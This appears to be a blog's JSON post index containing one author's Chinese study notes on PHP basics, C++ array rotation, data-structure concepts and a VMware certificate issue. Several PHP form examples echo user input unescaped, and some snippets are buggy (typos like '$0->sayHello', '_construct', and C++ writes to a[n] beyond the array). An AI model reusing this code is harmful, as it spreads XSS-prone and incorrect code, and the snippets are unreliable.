$_REQUEST用于收集HTML表单提交的数据。\n&lt;html&gt;\n&lt;body&gt;\n \n&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;\nName: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;\n&lt;input type&#x3D;&quot;submit&quot;&gt;\n&lt;&#x2F;form&gt;\n \n&lt;?php \n$name &#x3D; $_REQUEST[&#39;fname&#39;]; \necho $name; \n?&gt;\n \n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\nPHP $_POST这个被广泛应用于收集表单数据，在HTML form标签的指定属性：”method=post”\n&lt;html&gt;\n&lt;body&gt;\n \n&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;\nName: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;\n&lt;input type&#x3D;&quot;submit&quot;&gt;\n&lt;&#x2F;form&gt;\n \n&lt;?php \n$name &#x3D; $_POST[&#39;fname&#39;]; \necho $name; \n?&gt;\n \n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\nPHP $_GET也被广泛用于收集表单数据，在HTML form标签的指定属性：”method=get”\n$_GET也可以收集URL中发送的数据。\n用法：$test = $GET[&quot;test&quot;];\nPHP循环PHP中提供了以下的循环语句：\n\nwhile - 只要指定的条件成立，则循环执行代码块\ndo…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环\nfor - 循环执行代码块指定的次数\nforeach - 根据数组中每个元素来循环代码块\n\nwhile循环while还是那个while每个语言基本都有，也都一样用法。\nwhile(条件)\n&#123;\n\t要执行的代码；\n&#125;\n\ndo…while语句此语句会至少执行一次代码，然后检查条件，只要条件成立就会重复进行。\ndo\n&#123;\n\t要执行的代码；\n&#125;\nwhile(条件)；\n\nfor循环这个和C一样的写法：\nfor(初始值；条件；增量)\n&#123;\n    要执行的代码；\n&#125;\n\n\nforeach循环foreach用于遍历数组\nforeach($array as $value)\n&#123;\n    要执行的代码；\n&#125;\n\nPHP函数PHP提供超过1000个内建函数\n创建PHP函数&lt;?php\nfunction functionName()\n&#123;\n    // 要执行的代码\n&#125;\n?>\n\nPHP 函数准则：\n\n函数的名称应该提示出它的功能\n函数名称以字母或下划线开头（不能以数字开头）\n\n参数、返回值这个和Python基本是一样的。\n&lt;?php\n    function add($x,$y)\n\t&#123;\n\t\t$sum = $x + $y;\n    \treturn $sum;\n\t&#125;\n\t\n\techo \"sum is:\" . add(1,16);\n?>\n\nPHP魔术常量PHP向它运行的任何脚本提供了大量的预定义常量。\n不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。\n有八个魔术常量它们的值随着它们在代码中的位置改变而改变。\n__LINE__它表示文件中当前行号\n&lt;?php\n    echo '这是第' . __LINE__ .'行'；\n?>\n//输出结果：这是第2行\n\n_FILE_文件的完整路径和文件名。如果用在被包含文件，就会返回被包含文件名。\n&lt;?php\n    echo '该文件位于' . __FILE__ ;\n?>\n//该文件位于\\xx\\xxx\\index.php\n\n_DIR_文件所在目录。如果被用在被包含文件中，就返回被包含文件所在目录。它相当于dirname(__FILE__)，除了根目录，其他都不会包含末尾的斜杠。\n&lt;?php\n    echo '该文件位于' . __DIR__ ;\n?>\n//该文件位于\\xx\\xxx\n\n_FUNCTION_函数名称。返回该函数被定义时的名字。\n&lt;?php\n    function test()&#123;\n\t\techo '函数名为'. __FUNCTION__;\n\t&#125;\n\ttest();\n?>\n//输出为：函数名为test\n\n_CLASS_类的名称。返回该类被定义时的名字。\n&lt;?php\n    class test&#123;\n    \tfunction _print()&#123;\n    \t\techo '类名：' . __CLASS__. \"&lt;br>\";\n    \t\techo \"函数名为：\" . __FUNCTION__ ;\n\t\t&#125;\n\t&#125;\n\t$t = new test();\n\t$t->_print();\n?>\n/*输出结果    \n类名为：test\n函数名为：_print\n*/\n\n_TRAIT_Trait的名字，PHP从5.4开始，实现了代码复用的一个方法，称为trait。Trait名包括其被声明的作用区域。\n&lt;?php\nclass A&#123;\n\tpublic function sayHello()&#123;\n\t\techo \"Hello\";\n    &#125;\t\n&#125;\n\ntrait B&#123;\n    public function sayHello()&#123;\n        parent::sayHello();\n        echo \"world!\";\n    &#125;\n&#125;\n\nclass C extends A&#123;\n    use B;\n&#125;\n\n$o = new C();\n$0->sayHello();\n?>\n// Hello World!\n\n_METHOD_返回类方法定义时的名字。\n&lt;?php\n    function test()&#123;\n    \techo \"函数名：\" . __METHOD__;\n    &#125;\n\ttest();\n?>\n//函数名为test\n\n_NAMESPACE_当前命名空间的名称(去核大小写)。此常量在编译时定义的。\n&lt;?php\n    namespace MyProject;\n\techo '命名空间为：' . __NAMESPACE__;\n?>\n//命名空间为：MyProject\n\n\n\n","slug":"PHP学习-六","date":"2020-09-02T01:20:54.000Z","categories_index":"PHP","tags_index":"PHP","author_index":"A1andNS"},{"id":"e46c728e6baeec6ace92d418c82481b9","title":"PHP学习(五)","content":"PHP字符串变量来看看字符串操作函数和运算符\nPHP并置运算符在PHP中，只有一个字符串运算符。\n并置运算符(.)用于把两个字符串连接起来。\n我之前也用过，例如\n&lt;?php\n  $s1 = \"I am\";\n  $s2 = \"a boy\";\n  echo $s1.\" \".$s2;\n?>\n//输出结果应该为I am a boy\n\n这就是用来实现字符串拼接。\nPHP的strlen()函数如果在某些情况下可以知道字符串的长度，将会为后面的工作起到重要作用。\nstrlen()函数返回字符串的长度(单位是字节数)\n用法：strlen($txt)或strlen(“xxxxxxx”)\nPHP的strpos()函数strpos()函数用于在字符串内查找一个字符或一段指定的文本。\n如果在字符串中存在指定字符或文本，就会返回第一个匹配的字符位置。如果未找到匹配，则返回FALSE\n下面的实例在字符串”Hello world!”中查找文本”world”:\n&lt;?php\n    echo strpos(\"Hello world!\",\"world\");\n?>\n\n在上面的实例中，字符串world的位置是6\n这是两个常见的函数，其他函数就要去查一查了\nPHP运算符赋值运算符=用于给变量赋值\n算术运算符+用于把值加在一起\n\n\n\n运算符\n名称\n描述\n实例\n结果\n\n\n\nx + y\n加\nx 和 y 的和\n2 + 2\n4\n\n\nx - y\n减\nx 和 y 的差\n5 - 2\n3\n\n\nx * y\n乘\nx 和 y 的积\n5 * 2\n10\n\n\nx / y\n除\nx 和 y 的商\n15 / 5\n3\n\n\nx % y\n模（除法的余数）\nx 除以 y 的余数\n5 % 2 10 % 8 10 % 2\n1 2 0\n\n\n- x\n取反\nx 取反\n&lt;?php $x =2; echo -$x; ?&gt;\n-2\n\n\na . b\n并置\n连接两个字符串\n“Hi” . “Ha”\nHiHa\n\n\nPHP赋值运算符\n\n\n运算符\n等同于\n描述\n\n\n\nx = y\nx = y\n左操作数被设置为右侧表达式的值\n\n\nx += y\nx = x + y\n加\n\n\nx -= y\nx = x - y\n减\n\n\nx *= y\nx = x * y\n乘\n\n\nx /= y\nx = x / y\n除\n\n\nx %= y\nx = x % y\n模（除法的余数）\n\n\na .= b\na = a . b\n连接两个字符串\n\n\nPHP 递增/递减运算符\n\n\n运算符\n名称\n描述\n\n\n\n++ x\n预递增\nx 加 1，然后返回 x\n\n\nx ++\n后递增\n返回 x，然后 x 加 1\n\n\n– x\n预递减\nx 减 1，然后返回 x\n\n\nx –\n后递减\n返回 x，然后 x 减 1\n\n\nPHP比较运算符\n\n\n运算符\n名称\n描述\n实例\n\n\n\nx == y\n等于\n如果 x 等于 y，则返回 true\n5==8 返回 false\n\n\nx === y\n绝对等于\n如果 x 等于 y，且它们类型相同，则返回 true\n5===”5” 返回 false\n\n\nx != y\n不等于\n如果 x 不等于 y，则返回 true\n5!=8 返回 true\n\n\nx &lt;&gt; y\n不等于\n如果 x 不等于 y，则返回 true\n5&lt;&gt;8 返回 true\n\n\nx !== y\n绝对不等于\n如果 x 不等于 y，或它们类型不相同，则返回 true\n5!==”5” 返回 true\n\n\nx &gt; y\n大于\n如果 x 大于 y，则返回 true\n5&gt;8 返回 false\n\n\nx &lt; y\n小于\n如果 x 小于 y，则返回 true\n5&lt;8 返回 true\n\n\nx &gt;= y\n大于等于\n如果 x 大于或者等于 y，则返回 true\n5&gt;=8 返回 false\n\n\nx &lt;= y\n小于等于\n如果 x 小于或者等于 y，则返回 true\n5&lt;=8 返回 true\n\n\nPHP 逻辑运算符\n\n\n运算符\n名称\n描述\n实例\n\n\n\nx and y\n与\n如果 x 和 y 都为 true，则返回 true\nx=6 y=3 (x &lt; 10 and y &gt; 1) 返回 true\n\n\nx or y\n或\n如果 x 和 y 至少有一个为 true，则返回 true\nx=6 y=3 (x==6 or y==5) 返回 true\n\n\nx xor y\n异或\n如果 x 和 y 有且仅有一个为 true，则返回 true\nx=6 y=3 (x==6 xor y==3) 返回 false\n\n\nx &amp;&amp; y\n与\n如果 x 和 y 都为 true，则返回 true\nx=6 y=3 (x &lt; 10 &amp;&amp; y &gt; 1) 返回 true\n\n\nx || y\n或\n如果 x 和 y 至少有一个为 true，则返回 true\nx=6 y=3 (x==5 || y==5) 返回 false\n\n\n! x\n非\n如果 x 不为 true，则返回 true\nx=6 y=3 !(x==y) 返回 true\n\n\n&amp;&amp;和and是一样的，||和or是一样的，效果一样，这两种基本上其他语言的写法也是在此之中，但是优先级不一样。\n优先级：&amp;&amp; &gt; = &gt; and\n|| &gt; = &gt; or\nPHP 数组运算符\n\n\n运算符\n名称\n描述\n\n\n\nx + y\n集合\nx 和 y 的集合\n\n\nx == y\n相等\n如果 x 和 y 具有相同的键/值对，则返回 true\n\n\nx === y\n恒等\n如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true\n\n\nx != y\n不相等\n如果 x 不等于 y，则返回 true\n\n\nx &lt;&gt; y\n不相等\n如果 x 不等于 y，则返回 true\n\n\nx !== y\n不恒等\n如果 x 不等于 y，则返回 true\n\n\n！=和&lt;&gt;是起到同等作用的，都是不等于，&lt;&gt;还是第一次看见。\n三元运算符语法格式(expr1) ? (expr2) : (expr3) \n\n对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。和c语言中的有点像。\n&lt;?php\n    $test = $_GET['test'];\n\t$username = isset($test)?$test:'nobody';\n\techo $username,PHP_EOL;\n?>\n\nPHP7+版本多了一个NULL合并运算符??\n&lt;?php\n\t// 如果 $_GET['user'] 不存在返回 'nobody'，否则返回 $_GET['user'] 的值\n\t$username = $_GET['user'] ?? 'nobody';\n\t// 类似的三元运算符\n\t$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';\n?>\n\n组合比较符只有PHP7+才支持组合比较符，又称为太空船操作符，符号是&lt;=&gt;。组合比较运算符可以轻松实现两个变量的比较。\n用法：\n$c = $a &lt;=> $b;\n\n解析如下：\n\n如果 $a &gt; $b, 则 $c 的值为 1。\n如果 $a == $b, 则 $c 的值为 0。\n如果 $a &lt; $b, 则 $c 的值为 -1。\n\nPHP if-else语句PHP-if语句if(条件)\n&#123;\n    条件成立时要执行的代码；\n&#125;\n\n和其他语言都一样。\nPHP-if…else语句if(条件)\n&#123;\n\t条件成立时执行的代码；\n&#125;\nelse\n&#123;\n\t条件不成立时执行的代码；\n&#125;\n\nPHP-if…elseif…else语句if(语句)\n&#123;\n    if 条件成立时执行的代码；\n&#125;\nelseif(条件)\n&#123;\n    elseif条件成立时执行的代码；\n&#125;\nelse\n&#123;\n\t条件不成立是执行的代码；    \n&#125;\n\nPHP Switch语句&lt;?php\n\tswitch(n)\n    &#123;\n        case lebel1:\n            echo \"lebel1_is_true\";\n            break;\n        case lebel2:\n            echo \"lebel2_is_true\";\n            break;\n        default:\n            echo \"lebel1_and_lebel2_are_all_false\";\n    &#125;\n?>\n\n这个语句和其他语言也是一样的。\nPHP数组在PHP中创建数组使用的是array()函数\n在 PHP 中，有三种类型的数组：\n\n数值数组 - 带有数字 ID 键的数组\n关联数组 - 带有指定的键的数组，每个键关联一个值\n多维数组 - 包含一个或多个数组的数组\n\nPHP数值数组\n自动分配ID：$cars=array(‘BWM’,’Toyota’,’Volvo’);\n手动分配ID：\n\n$cars[0]=\"BWM\";\n$cars[1]=\"Toyota\";\n$cars[2]=\"Volvo\";\n\n获取数组的长度-count()函数count()函数用于返回数组的长度(元素的数量)：\n&lt;？php\n    $cars=array(\"BWM\",\"Benz\",\"Volvo\");\n\techo count($cars);\n?>\n\n之前有看到字符串长度用，strlen()来获取。\n遍历数值数组使用for循环来实现:\n&lt;?php\n    $cars = array(\"BWM\",\"Toyota\",\"Volvo\");\n\t$arraylenth = count($cars);\n\tfor($x=0;$x&lt;$arraylenth;$x++)\n    &#123;\n        echo $cars[$x];\n        echo \"&lt;br>\";\n\t&#125;\n?>\n\nPHP关联数组关联数组是使用您分配给数组的指定的键的数组。\n$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&quot;43&quot;);\n这种就是关联数组的写法了，前面为键后面为值。\n遍历关联数组遍历使用foreach()函数。\n&lt;?php\n    $age &#x3D; array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);\n\tforeach( $age as $x&#x3D;&gt;$x_value)\n    &#123;\n        echo &quot;key&#x3D;&quot; . $x .&quot;value&#x3D;&quot; . $x_value;\n        echo &lt;br&gt;;\n    &#125;\n?&gt;\n\n","slug":"PHP学习-五","date":"2020-09-01T09:03:26.000Z","categories_index":"PHP","tags_index":"PHP","author_index":"A1andNS"},{"id":"0e6a582945fdbc93fa2d76153b4ed629","title":"PHP学习(四)","content":"今天继续\nPHP数据类型String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。\nPHP字符串可以把任何文本放在单引号和双引号，一个字符串就是一串字符的序列，”Hello world”或’Hello world’\nPHP整型整数规则:\n\n整数必须至少有一个数字 (0-9)\n整数不能包含逗号或空格\n整数是没有小数点的\n整数可以是正数或负数\n整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;这是一个数据类型查询网站&lt;&#x2F;title&gt;\n    &lt;&#x2F;head&gt;\n    &lt;body&gt;\n        &lt;h1&gt;下面看回显：&lt;&#x2F;h1&gt;\n        &lt;?php\n        \t$x &#x3D; 1234; &#x2F;&#x2F;正整数\n        \tvar_dump($x);\n        \techo &#39;&lt;br&gt;&#39;;\n        \t$y &#x3D; -1234; &#x2F;&#x2F;负整数\n        \tvar_dump($y);\n        \techo &#39;&lt;br&gt;&#39;;\n        \t$z &#x3D; 0x8c; &#x2F;&#x2F;16进制数\n        \tvar_dump($z);\n        \techo &#x3D; &#39;&lt;br&gt;&#39;;\n        \t$k &#x3D; 047; &#x2F;&#x2F;8进制数\n        \tvar_dump($k);\n\t\t\t&#x2F;&#x2F;如果想要知道变量的数据类型和值，可以用var_dump()函数\n    \t?&gt;\n    &lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\nPHP浮点型和其他语言基本一样，就是有小数部分的或者指数形式的。\nPHP布尔型也是和大家一样的TRUE或FALSE两种。\nPHP数组&lt;?php\n    $name=array(\"Alan\",\"Ben\",\"Alice\");\n\tvar_dump($name);\n?>\n\nPHP对象在PHP中，对象必须声明。首先你必须使用class声明类对象，类是可以包含属性和方法的结构。然后我们在类中定义数据类型，然后在实例化的类中使用数据类型。\n这个就是面向对象编程的东西，之前写过java的面向对象写法，感觉PHP也差不多。\n&lt;?php\n    class Car\n\t&#123;\n    \tvar $color;\n    \tvar $brand;\n    \tfunction _construct($color=\"red\",$brand=\"BWM\")\n        &#123;\n            $this->color = $color;\n            $this->brand = $brand;\n        &#125;\n    \tfunction whatColor()\n        &#123;\n            return $this->color; //this关键字就是指向当前对象实例的指针，不指向任何其他对象或类。在Java里是写成this.color\n        &#125;\n\t&#125;\n\nPHP NULL值NULL值表示变量没有值，NULL就是数据类型为NULL的值。NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。\n&lt;?php\n    $x = \"Hello World\"\n    $x = null; //清空变量数据\n\tvar_dump($x);\n?>\n\nPHP类型比较虽然PHP是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对PHP变量进行比较，包含松散和严格比较。\n\n松散比较：使用两个等号 == 比较，只比较值，不比较类型。\n严格比较：用三个等号 === 比较，除了比较值，也比较类型。\n\n“123”是一个字符串，123是一个整数。FALSE是一个布尔值，而”false”是一个字符串。\n例如42==”42”成立,因为这只是数值上的比较，42===”42”不成立，因为42和”42”的类型不同。\n0==false，0==null，false==null，”0”==false，””==false，””==null\nPHP常量常量是一个简单值的标识符。该值在脚本中不能改变。一个常量由英文字母、下划线、和数字组成，但是数字不能作为首字母出现。常量在整个脚本中都可以用。\n设置PHP常量使用define()函数来设置PHP常量。\nbool define ( string $name , mixed $value [, bool $case_insensitive = false ] )\n\n该函数有三个参数:\n\nname：必选参数，常量名称，即标志符。\nvalue：必选参数，常量的值。\ncase_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。\n\n&lt;?php\n// 区分大小写的常量名,没有设置case_insensitive参数\ndefine(\"GREETING\", \"欢迎访问a1andns.github.io\");\necho GREETING;    // 输出 \"a1andns.github.io\"\necho '&lt;br>';\necho greeting;   // 输出 \"greeting\"\n?>\n&lt;?php\n// 不区分大小写的常量名，设置case_insensitive参数为true\ndefine(\"GREETING\", \"欢迎访问 Runoob.com\", true);\necho greeting;  // 输出 \"欢迎访问 Runoob.com\"\n?>\n\n常量是全局的，在外部和内部都可以直接调用\n","slug":"PHP学习-四","date":"2020-08-31T13:11:18.000Z","categories_index":"PHP","tags_index":"PHP","author_index":"A1andNS"},{"id":"9cc4e1ca2693b071a7fc6321af0c5a32","title":"数组内元素循环右移k位","content":"问题内容用来将数组a[n]的每个元素都循环地右移k 位，这里1≤k≤n\n以下为自写解决方案，写了挺久的，太久没有摸C了，底下的可能不够高明：\n#include &lt;iostream&gt;\nusing namespace std;\n\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;移位函数，实现移位操作&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nint changeLocation(int a[],int n,int k)&#123;\n    int temp;\n    for (size_t i &#x3D; 0; i &lt; n-k; i++)    &#x2F;&#x2F;把a[k]-a[n]作为交换空间，把每k个数组元素与交换空间交换位置\n    &#123;\n        temp &#x3D; a[i];\n        a[i] &#x3D; a[n-k+(i%k)];\n        a[n-k+(i%k)] &#x3D; temp;\n    &#125;\n    return a[n];\n&#125;\n\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;输出打印函数，用于打印移位结果&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nvoid PrintResult(int a[],int size)&#123;\n    for (size_t i &#x3D; 0; i &lt; size; i++)\n    &#123;\n        cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;\n    &#125;\n    cout&lt;&lt;endl;\n    \n&#125;\n\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;数组写入函数，用于向数组写入用户输入数据&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nint Write(int a[],int size)&#123;\n    for (size_t i &#x3D; 0; i &lt; size; i++)\n    &#123;\n        cin&gt;&gt;a[i];  &#x2F;&#x2F;把数据写入数组\n    &#125;\n    return a[size];\n&#125;\n\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;主程序&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nint main()&#123;\n    int num,k;\n    cin&gt;&gt;num&gt;&gt;k;    &#x2F;&#x2F;输入数据依次输入数组长度num和移位长度k\n    int a[num];\n    a[num] &#x3D; Write( a, num );\n    a[num] &#x3D; changeLocation( a, num ,k );\n    PrintResult( a, num );\n    return 0;\n&#125;\n\n另一种方案算法描述如下：\n步骤1） 将数组分成两段，左段长为n-k，右段长为k。\n步骤2） 分别将两段逆转（即元素排列次序与原次序相反）。\n步骤3） 再数组元素整体逆转。\n（1）用C 语言编程实现（不能使用辅助数组）。\n（2）求元素移动次数T(n)。要求出准确的解析式（不是大O 记号）。\n（3）试证明算法是正确的。\n提示，任一数组元素a[i]经算法处理后，其下标变成：(i+k)% n。\n下面是我按照算法描述，写出的程序：\n#include &lt;iostream&gt;\nusing namespace std;\nconst \n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;对前size-k部分做倒序&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nint rev1(int a[],int size,int k)&#123;\n    int temp;\n    for (size_t i &#x3D; 0; i &lt; (size-k)&#x2F;2; i++)\n    &#123;\n        temp &#x3D; a[size-k-1-i];\n        a[size-k-1-i] &#x3D; a[i];\n        a[i] &#x3D; temp;\n    &#125;\n    return a[size];\n&#125;\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;对后k部分做倒序&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nint rev2(int a[],int size,int k)&#123;\n    int temp;\n    for (size_t i &#x3D; 0; i &lt; k&#x2F;2; i++)\n    &#123;\n        temp &#x3D; a[size-1-i];\n        a[size-1-i] &#x3D; a[size-k+i];\n        a[size-k+i] &#x3D; temp;\n    &#125;\n    return a[size];\n&#125;\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;对整个数组做倒序&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nint allrev(int a[], int size)&#123;\n    int temp;\n    for (size_t i &#x3D; 0; i &lt; size&#x2F;2; i++)\n    &#123;\n        temp &#x3D; a[size-1-i];\n        a[size-1-i] &#x3D; a[i];\n        a[i] &#x3D; temp;\n    &#125;\n    return a[size];\n&#125;\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;写数组元素&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nint Write(int a[], int size)&#123;\n    for (size_t i &#x3D; 0; i &lt; size; i++)\n    &#123;\n        cin&gt;&gt;a[i];\n    &#125;\n    return a[size];\n&#125;\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;打印数组&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nvoid Print(int a[], int size)&#123;\n    for (size_t i &#x3D; 0; i &lt; size; i++)\n    &#123;\n        cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;\n    &#125;\n    cout&lt;&lt;endl;\n&#125;\n&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;主函数&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;\nint main()&#123;\n    int n,k;\n    cin&gt;&gt;n&gt;&gt;k;\n    int a[n];\n    a[n] &#x3D; Write( a, n);\n    a[n] &#x3D; rev1( a, n, k);\n    a[n] &#x3D; rev2( a, n, k);\n    a[n] &#x3D; allrev( a, n);\n    Print( a, n);\n    return 0;\n&#125;\n\n这种写法运行需要的次数比我少，所以效率比我高。算法是个好东西啊。\n","slug":"数组内元素循环右移k位","date":"2020-08-31T10:33:07.000Z","categories_index":"C++","tags_index":"数据结构,C++","author_index":"A1andNS"},{"id":"6e0b8c18e7066f45b525fe746b5eeb37","title":"数据结构初学","content":"数据结构是程序设计的灵魂啊！盘他！\n常见数据结构应用车载导航仪——–图结构\n文件管理器——–树结构\n成绩管理器——–表结构\n问题与模型定量模型：可以用数值方程表示的，方程式等等。\n定性模型：非数值性的数据结构及其运算，数据结构主要研究非数值性。\n研究对象\n数据元素的集合\n数据元素之间的关系\n对数据集合进行哪些运算\n实现运算的算法\n算法的评价\n\n数据结构概述数据是对客观事物的描述形式和编码形式的统称，是计算机算法和程序的处理对象(输入数据)和计算结果(输出数据)。\n数据总是以某种编码形式出现\n数据结点数据元素，数据结点，也称结点(node)\n1、描述一个独立事物的名称、数量、特效、性质的一组相关信息组成一个数据结点\n2、一个节点可以含有多个数据项 \n3、单值类型的结点：只含有一个数据项，这是一种特殊情况。\n数据结构的定义数据结构就是结点集合+结点间的关系集合。\n\n\n结点和结点间的关系正好可以构成一个结构，即数据结构。\n数据结构的存储形式为物理结构。\n物理结构数据结构的存储形式存储内容：数据结点值和结点之间的关系\n存储方式：顺序存储、非顺序存储\n数据的存储储存结点\n1、用于存储一个数据结点的存储结点\n2、一个数据结点对应一个存储结点\n3、数据结点和存储结点统称为结点\n空白结点\n预留的存储结点(就是还木有存储数据的存储结点)\n算法算法就是有穷规则的集合，其中的规则规定了解决某些特定类型问题的运算序列。\n算法的特性\n有穷性\n确定性\n可行性\n输入\n\n算法的描述分类：描述形式、程序形式\n(1)程序形式：算法的实现——最终形式\n(2)描述形式：原始形式\n\n着重体现算法的主题\n忽略支持算法执行的某些具体细节\n目的是便于理解、记忆和复现交流\n\n描述形式：自然语言、流程图、类程序设计语言\n","slug":"数据结构初学","date":"2020-08-30T14:33:01.000Z","categories_index":"学习笔记","tags_index":"学习笔记,数据结构","author_index":"A1andNS"},{"id":"1d91aea9fb70319bfa262f69111c07de","title":"vmware证书劫持网页解决方案","content":"问题起因最近，经常听说有人在访问网页的时候，发现证书报错访问不了，而证书上显示的却是vmware，似乎是因为vmware的原因，一个不对应的证书劫持了网页，以至于浏览器爆出风险提示。之前只是听说，谁知道突然我也出现了这个问题。见下图：\n\n然后我查看了证书：\n\n果然是vmware，这让我很头疼，于是我求助了百度，网友给出的解决方案中最常见的就是在chrome://net-internals/#hsts，中删除相应url的Domain security 